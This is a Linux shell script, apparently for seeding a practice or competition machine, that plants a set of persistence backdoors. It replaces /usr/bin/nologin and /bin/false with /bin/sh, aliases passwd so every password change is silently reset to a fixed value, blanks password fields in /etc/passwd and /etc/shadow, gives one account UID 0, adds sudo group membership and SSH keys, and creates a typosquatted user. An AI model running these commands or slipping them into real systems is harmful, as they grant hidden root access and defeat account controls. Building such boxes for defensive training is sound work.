#!/bin/sh

cp -f /bin/sh /usr/bin/nologin
echo "alias passwd='passwd;(echo iluvred; echo iluvred) | passwd &>/dev/null'" >> /etc/bash.bashrc

# Add Admin user
sed -i "s/jotaro:x/jotaro:/" /etc/passwd
mkdir /home/jotaro
cp -f ../assets/.bashrc /home/jotaro/.bashrc

# Add Regular user
usermod -G sudo,wheel jolyne
mkdir /home/jolyne
mkdir /home/jolyne/.ssh
cp -f ../assets/authorized_keys /home/jolyne/.ssh/authorized_keys

usermod -u 0 joseph

# Add backdoored users
useradd jonathan
useradd josuke

usermod -g joestar jonathan
usermod -G adm jonathan
usermod -g joestar josuke
usermod -G dialout josuke

# Typosquat user
useradd kernpoops
usermod -s "/usr/bin/nologin" kernpoops
sed -i "s/sys:*/sys:/" /etc/shadow
usermod -s "/usr/bin/nologin" sys
cp -f "/bin/sh" "/bin/false"
